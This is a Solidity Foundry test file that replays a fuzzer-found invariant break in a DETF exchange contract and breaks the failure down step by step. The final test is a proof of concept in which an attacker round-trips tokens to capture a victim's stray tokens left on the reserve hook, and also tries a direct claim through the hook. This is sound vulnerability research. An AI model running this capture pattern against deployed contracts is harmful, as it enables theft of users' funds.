// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {DetfInvariantRichTest} from "./DetfInvariantBase.sol";

/// Replay + decomposition of deep-campaign break: DetfInvariantRichTest INV-3
///   a_pretransfer(3e14, 23625, 2^256-4) then h_roundTrip(145)
/// tokSel = 3e14 % 3 = 0 (pair), dstSel = 23625 % 4 = 1 (reserve hook), amtSeed % 3 == 0 -> amt = bal/10 - 2.
contract DzDetfInv3Test is DetfInvariantRichTest {
    uint256 constant SEED = 115792089237316195423570985008687907853269984665640564039457584007913129639932;

    function _rt(address who, uint256 amt) internal returns (uint256 m, uint256 out) {
        vm.startPrank(who);m = IStandardExchangeIn(detf).exchangeIn(IERC20(address(pairToken)), amt, IERC20(detf), 0, who, false, block.timestamp + 1 hours);out = IStandardExchangeIn(detf).exchangeIn(IERC20(detf), m, IERC20(address(pairToken)), 0, who, false, block.timestamp + 1 hours);
        vm.stopPrank();
    }

    function _amt() internal pure returns (uint256) {
        // bound(145, 1e15, 100 ether): x < min -> max - ((min - x) % size) + 1
        uint256 mn = 1e15; uint256 mx = 100 ether; uint256 size = mx - mn + 1;
        return mx - ((mn - 145) % size) + 1;
    }

    /// exact shrunk sequence
    function test_replay() public {
        uint256 hb0 = pairToken.balanceOf(reserveHook);
        h.a_pretransfer(300000000000000, 23625, SEED);
        uint256 gift = pairToken.balanceOf(reserveHook) - hb0;
        console2.log("gift of pair to reserve hook (wei)", gift);
        h.h_roundTrip(145);
        console2.log("roundTripViol / residualCapture", h.ghost_roundTripViol(), h.ghost_roundTripResidualCapture());
        console2.log("hook pair bal after", pairToken.balanceOf(reserveHook));
        assertEq(h.ghost_roundTripViol(), 1, "replays");
    }

    /// decompose: same honest round trip with vs without the stray pair on the hook
    function test_decompose() public {
        uint256 amt = _amt();
        address alice = h.alice();
        uint256 snap = vm.snapshotState();
        h.arbNow();
        (uint256 m0, uint256 o0) = _rt(alice, amt);
        console2.log("NO GIFT  amt / m / out", amt, m0, o0);
        console2.log("NO GIFT  pnl (signed)");
        console2.logInt(int256(o0) - int256(amt));
        vm.revertToState(snap);

        uint256 hb0 = pairToken.balanceOf(reserveHook);
        h.a_pretransfer(300000000000000, 23625, SEED);
        uint256 gift = pairToken.balanceOf(reserveHook) - hb0;
        h.arbNow();
        uint256 hb1 = pairToken.balanceOf(reserveHook);
        vm.startPrank(alice);uint256 m = IStandardExchangeIn(detf).exchangeIn(IERC20(address(pairToken)), amt, IERC20(detf), 0, alice, false, block.timestamp + 1 hours);
        vm.stopPrank();
        uint256 hb2 = pairToken.balanceOf(reserveHook);
        vm.startPrank(alice);uint256 out = IStandardExchangeIn(detf).exchangeIn(IERC20(detf), m, IERC20(address(pairToken)), 0, alice, false, block.timestamp + 1 hours);
        vm.stopPrank();
        uint256 hb3 = pairToken.balanceOf(reserveHook);
        console2.log("GIFT     gift", gift);
        console2.log("GIFT     hook pair bal: before arb/after arb", hb0 + gift, hb1);
        console2.log("GIFT     hook pair bal: after mint / after burn", hb2, hb3);
        console2.log("GIFT     amt / m / out", amt, m, out);
        console2.log("GIFT     pnl (signed)");
        console2.logInt(int256(out) - int256(amt));
        console2.log("GIFT     m - m0 (extra DETF minted, signed)");
        console2.logInt(int256(m) - int256(m0));
    }

    /// realistic framing: a victim's stray (non-atomic) pair on the hook; an unprivileged attacker round-trips.
    function test_attackerCapturesStray() public {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        uint256 G = 10 ether;
        pairToken.mint(victim, G);
        pairToken.mint(attacker, 100 ether);
        vm.prank(attacker);
        pairToken.approve(detf, type(uint256).max);
        vm.prank(attacker);
        IERC20(detf).approve(detf, type(uint256).max);
        h.arbNow();

        uint256 snap = vm.snapshotState();
        (uint256 mb, uint256 ob) = _rt(attacker, 100 ether);
        console2.log("baseline attacker rt m/out", mb, ob);
        console2.logInt(int256(ob) - 100 ether);
        vm.revertToState(snap);

        vm.prank(victim);
        pairToken.transfer(reserveHook, G); // victim's mis-sent / staged pretransfer
        uint256 a0 = pairToken.balanceOf(attacker);
        (uint256 m, uint256 out) = _rt(attacker, 100 ether);
        uint256 a1 = pairToken.balanceOf(attacker);
        console2.log("stray G / attacker m / out", G, m, out);
        console2.log("attacker pair pnl (signed)");
        console2.logInt(int256(a1) - int256(a0));
        console2.log("attacker leftover DETF", IERC20(detf).balanceOf(attacker));
        console2.log("hook pair bal after", pairToken.balanceOf(reserveHook));

        // direct claim of the stray via hook pretransferred=true by an EOA
        vm.revertToState(snap);
        vm.prank(victim);
        pairToken.transfer(reserveHook, G);
        vm.prank(attacker);try IStandardExchangeIn(reserveHook).exchangeIn(IERC20(address(pairToken)), G, IERC20(detf), 0, attacker, true, block.timestamp + 1 hours) returns (uint256 o, uint256) {
            console2.log("EOA direct hook pretransferred claim OK, DETF out", o);
        } catch (bytes memory e) {
            console2.log("EOA direct hook pretransferred claim reverted");
            console2.logBytes(e);
        }
    }
}
